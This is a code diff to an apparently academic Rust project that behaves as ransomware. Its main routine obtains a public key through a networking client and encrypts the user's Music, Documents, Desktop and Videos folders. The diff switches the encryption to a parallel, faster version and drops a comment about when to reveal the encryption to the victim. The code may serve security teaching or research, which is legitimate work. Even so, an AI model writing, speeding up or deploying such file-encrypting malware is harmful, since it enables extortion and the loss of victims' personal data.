@@ -3,7 +3,8 @@ use std::fs;
 
 use anyhow::Result;
 
-use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
+// use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
+use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
 use c_monster_co_2ic80::networking::client::gen_key;
 
 use sodiumoxide::crypto::box_::{PublicKey};
@@ -29,7 +30,6 @@ fn desktop_file_path(filename: &str) -> Result<PathBuf> {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     sodiumoxide::init().unwrap();
 
-    // only reveal to user once the files are fully encrypted?
     let pk: PublicKey = gen_key().await?;
 
     let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
@@ -42,7 +42,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             println!("path: {:?}", path_buf);
 
 
-            match encrypt_folder(&path_buf, &pk) {
+            // match encrypt_folder(&path_buf, &pk) {
+            match encrypt_folder_parallel(&path_buf, &pk, None).await {
                 Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
                 Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
             }
